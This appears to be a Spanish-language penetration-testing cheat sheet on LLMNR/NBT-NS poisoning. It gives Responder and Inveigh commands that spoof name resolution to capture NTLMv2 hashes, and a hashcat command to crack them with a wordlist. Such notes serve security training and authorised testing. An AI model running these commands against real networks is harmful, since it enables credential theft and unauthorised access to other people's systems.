#mitm #responder
## LLMNR/NBT-NS Possoning
[Link-Local Multicast Name Resolution](https://datatracker.ietf.org/doc/html/rfc4795) (LLMNR) and [NetBIOS Name Service](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063(v=technet.10)?redirectedfrom=MSDN) (NBT-NS) son métodos alternativos de resolución de nombres que pueden ser usados cuando falla el DNS. Cualquier host puede responder utilizando alguno de los protocolos mencionados. 
## Linux - `responder`
### Configuración - `responder.conf`
Se pueden configurar los protocolos sobre los que actúar. Por defecto alojado en: 
```
/usr/share/responder
```
### Logs
Además de mostrar por pantalla los logs, responder guarda en un log la información recopilada: 
```
/usr/share/responder/logs
```
### Responder con configuración por defecto
```bash
sudo responder -I ens224
```
### Craquear NTMLv2 con hashcat
El hash que se captura en el paso anterior es un hash NTMLv2 ( [Hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)) 
```bash
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```

## **Inveigh**

[Inveigh](https://github.com/Kevin-Robertson/Inveigh) Sería la herramienta equivalente a `responder` en Windows, pero está escrita en Powershell y C#. Se puede usar cualquiera de las dos versiones

### Versión powershell

Podemos ver los parámetros que quedan por defecto [aquí](https://github.com/Kevin-Robertson/Inveigh#parameter-help). Para ejecutarlo con envenenamiento LLMNR y NBNS podemos escribir lo siguiente:

```powershell
Import-Module .\\Inveigh.ps1
# podemos ver los parámetros escribiendo lo siguiente
(Get-Command Invoke-Inveigh).Parameters
# Ejecución con spoofing LLMNR y NBNS 
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

El output de los HASH NTMLv2 quedaría en un archivo en la misma carpeta llamado `Inveigh-NTLMv2.txt`